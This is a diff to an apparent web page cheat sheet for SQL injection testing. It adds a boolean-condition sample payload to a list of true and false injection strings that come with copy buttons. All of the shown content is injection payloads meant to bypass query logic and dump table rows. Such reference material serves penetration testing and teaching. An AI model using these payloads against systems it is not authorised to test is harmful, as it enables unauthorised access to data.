@@ -64,6 +64,7 @@ Getting errors can represent the presence of the vulnerability. <b>[HTTP/2 500 I
 If the vulnerability is present the goal is to "close" the query and retrieve all, for that boolean conditions are used.
 	
 <b>C1: TRUE </b><p id="HDT01"><mark>' OR 1=1--</mark></p>
+<b>SAMPLE: </b><p id="HDT01"><mark>' or "1"="1"#</mark></p>
 <b>C2: TRUE </b><p id="HDT02"><mark>' and 'a'='a--</mark></p>
 <b>C3: FALSE </b><p id="HDT03"><mark>' and 1=2;--</mark></p>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT03')">.C3.</button></p>
